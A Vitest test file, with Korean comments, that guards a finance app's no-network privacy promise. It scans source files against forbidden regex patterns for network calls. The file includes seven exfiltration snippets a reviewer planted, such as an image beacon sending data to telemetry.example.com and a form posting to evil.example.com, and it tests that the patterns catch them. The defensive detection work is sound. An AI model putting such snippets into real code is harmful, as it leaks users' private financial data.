import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

/**
 * 이 제품의 약속은 "재무정보가 네트워크를 탈 경로가 코드상 존재하지 않는다"이다.
 * 설정이 아니라 구조로 보장되어야 하므로 소스를 직접 훑어 확인한다.
 *
 * 이 테스트만은 fs를 쓴다 — 순수 함수 규칙의 의도적 예외다.
 *
 * **이 배열이 이 제품의 privacy 약속을 지키는 유일한 구조적 장치다.** 과거
 * 버전은 `fetch(`, `XMLHttpRequest`, `WebSocket`, `navigator.sendBeacon`,
 * `https?://`만 잡았는데, 리뷰어가 스크래치 사본에 아래 7개의 실제 유출
 * 경로를 심었더니 전부 통과했다:
 *
 *   1. `export const FONT = "//fonts.googleapis.com/css2?family=Noto+Sans+KR";`
 *   2. `const img = new Image(); img.src = "//telemetry.example.com/collect?d=" + data;`
 *   3. `const f = globalThis.fetch; return f("/api/log", { method: "POST", body });`
 *   4. `return import(/* @vite-ignore *\/ url);`
 *   5. `export const FORM = '<form action="//evil.example.com/x" method="post">';`
 *   6. CSS `@import url(//fonts.googleapis.com/css2?family=Inter);`
 *   7. CSS `body { background: url(//cdn.example.com/bg.png); }`
 *
 * 원인은 좁은 패턴이었다: `fetch(`는 괄호를 요구해 `globalThis.fetch`처럼
 * 별칭을 거치면 빠져나가고, `https?://`는 프로토콜 상대 URL(`//host/...`,
 * CSS의 `url(//host/...)`)을 아예 보지 않았다. 아래 목록은 그 7개를 포함해
 * protocol-relative URL, `.src =` 대입, `new Image`, 동적 `import(`,
 * `navigator.sendBeacon`/`navigator.connection`, 별칭을 거친 `fetch`까지
 * 잡도록 넓혔고, `node:`/`require(`도 추가해 tsconfig.json이
 * `"types": ["node", "vite/client"]`를 갖게 되며 사라진 타입 체크 수준의
 * 방어선(Node API를 쓰면 타입 에러가 나던 것)을 이 테스트가 대신 지킨다.
 *
 * **패턴을 고치거나 추가할 때는 반드시 아래 `sample`도 그 패턴이 실제로
 * 잡아내는 최소 문자열로 채워라.** "패턴 자체를 핀 고정하는" 테스트가
 * 이 배열을 순회하며 `pattern.test(sample)`이 참인지 확인한다 — sample이
 * 없거나 패턴이 느슨해지면 그 테스트가 바로 빨갛게 죽는다. 이 핀이 없으면
 * "이 정규식이 지금도 뭔가를 잡고 있다"는 사실 자체가 다시 무인지대가 된다.
 */
interface ForbiddenPattern {
  pattern: RegExp;
  /** 이 패턴이 무엇을 겨냥하는지 (핀 테스트 실패 메시지에 쓰인다) */
  label: string;
  /** 이 패턴이 반드시 걸려야 하는 최소 재현 문자열 */
  sample: string;
}

const FORBIDDEN_PATTERNS: ForbiddenPattern[] = [
  {
    label: "XMLHttpRequest",
    pattern: /XMLHttpRequest/,
    sample: "new XMLHttpRequest()",
  },
  {
    label: "WebSocket",
    pattern: /\bWebSocket\b/,
    sample: "new WebSocket('wss://x')",
  },
  {
    label: "navigator.sendBeacon / navigator.connection",
    pattern: /\bnavigator\.(sendBeacon|connection)\b/,
    sample: "navigator.sendBeacon('/collect', data)",
  },
  {
    label: "http(s):// 리터럴 (w3.org 예외)",
    pattern: /https?:\/\/(?!www\.w3\.org)/,
    sample: "https://telemetry.example.com/collect",
  },
  {
    label: "fetch (별칭을 거친 참조 포함 — 괄호 요구하지 않음)",
    pattern: /\bfetch\b/,
    // 심어졌던 실제 우회: const f = globalThis.fetch; f(...)
    sample: "const f = globalThis.fetch;",
  },
  {
    label: "프로토콜 상대 URL (//host.tld, CSS url(//host.tld) 포함)",
    pattern: /(^|[^:a-zA-Z])\/\/[a-zA-Z0-9-]+\.[a-zA-Z]{2,}/,
    sample: '"//telemetry.example.com/collect?d=1"',
  },
  {
    label: ".src = 대입 (Image 등으로 픽셀/비콘 전송)",
    pattern: /\.src\s*=/,
    sample: 'img.src = "//telemetry.example.com/x";',
  },
  {
    label: "new Image (트래킹 픽셀)",
    pattern: /new\s+Image\b/,
    sample: "const img = new Image();",
  },
  {
    label: "동적 import( (임의 URL·모듈 로드)",
    pattern: /\bimport\s*\(/,
    sample: "return import(/* @vite-ignore */ url);",
  },
  {
    label: "node: 프로토콜 임포트",
    pattern: /\bnode:/,
    sample: 'import { readFileSync } from "node:fs";',
  },
  {
    label: "require(",
    pattern: /\brequire\s*\(/,
    sample: "const fs = require('fs');",
  },
];

const FORBIDDEN = FORBIDDEN_PATTERNS.map((p) => p.pattern);

/** src 트리 안에서, 이름이 정확히 이 문자열로 끝나는 파일 경로를 모두 찾는다 */
function findByNameSuffix(dir: string, suffix: string): string[] {
  return readdirSync(dir).flatMap((entry) => {
    const path = join(dir, entry);
    if (statSync(path).isDirectory()) return findByNameSuffix(path, suffix);
    return entry.endsWith(suffix) ? [path] : [];
  });
}

function sourceFiles(dir: string): string[] {
  return readdirSync(dir).flatMap((entry) => {
    const path = join(dir, entry);
    if (statSync(path).isDirectory()) return sourceFiles(path);
    if (!/\.(ts|tsx|css|html)$/.test(entry)) return [];
    if (entry.endsWith("no-network.test.ts")) return [];
    return [path];
  });
}

describe("네트워크 요청 없음", () => {
  it("소스 어디에도 네트워크 호출이 없다", () => {
    const offenders: string[] = [];

    for (const file of [...sourceFiles("src"), "index.html"]) {
      const content = readFileSync(file, "utf8");
      for (const pattern of FORBIDDEN) {
        if (pattern.test(content)) {
          offenders.push(`${file}: ${pattern}`);
        }
      }
    }

    expect(offenders).toEqual([]);
  });

  it("no-network.test.ts만 스캔에서 빠지고, 그 외 파일은 하나도 빠지지 않는다", () => {
    // 이름이 정확히 "no-network.test.ts"로 끝나는 파일이 이 파일 자신
    // 말고 더 있으면(우연히 같은 접미사를 가진 다른 파일이 생기면) 그것도
    // 조용히 스캔에서 빠지게 된다. 정확히 하나(이 파일 자신)여야 한다.
    const matches = findByNameSuffix("src", "no-network.test.ts");
    expect(matches).toEqual(["src/no-network.test.ts"]);

    // 제외 목록에 없는 실제 소스 파일들은 스캔 대상에 그대로 남아 있어야
    // 한다 — exclude 조건이 과하게 넓어져 다른 파일까지 삼키지 않았는지
    // 확인한다.
    const scanned = sourceFiles("src");
    expect(scanned).toContain("src/App.tsx");
    expect(scanned).toContain("src/lib/finance/index.ts");
    expect(scanned.some((f) => f.endsWith("no-network.test.ts"))).toBe(false);
  });

  describe("패턴 핀 고정 — 각 정규식이 실제로 뭔가를 잡아내는지 검증", () => {
    // 정규식을 고치다 실수로 느슨해지면(예: 괄호를 다시 요구하게 되돌리면)
    // 여기서 바로 실패한다. 실제 소스 스캔 테스트만으로는 "패턴이 아무것도
    // 안 걸러도" 통과해 버리므로, 그물 자체를 이 테스트로 고정한다.
    it.each(FORBIDDEN_PATTERNS)(
      "$label 패턴은 실제 유출 코드를 잡아낸다",
      ({ pattern, sample }) => {
        expect(pattern.test(sample)).toBe(true);
      },
    );
  });

  describe("리뷰어가 심었던 7개의 실제 유출 경로 재현", () => {
    // 고치기 전 no-network.test.ts는 이 7개 스니펫이 전부 통과했다.
    const PLANTED_EXFILTRATION_SAMPLES = [
      'export const FONT = "//fonts.googleapis.com/css2?family=Noto+Sans+KR";',
      'const img = new Image(); img.src = "//telemetry.example.com/collect?d=" + data;',
      'const f = globalThis.fetch; return f("/api/log", { method: "POST", body });',
      "return import(/* @vite-ignore */ url);",
      'export const FORM = \'<form action="//evil.example.com/x" method="post">\';',
      "@import url(//fonts.googleapis.com/css2?family=Inter);",
      "body { background: url(//cdn.example.com/bg.png); }",
    ];

    it.each(PLANTED_EXFILTRATION_SAMPLES)(
      "이제는 적어도 하나의 패턴이 걸린다: %s",
      (snippet) => {
        expect(FORBIDDEN.some((pattern) => pattern.test(snippet))).toBe(true);
      },
    );
  });
});
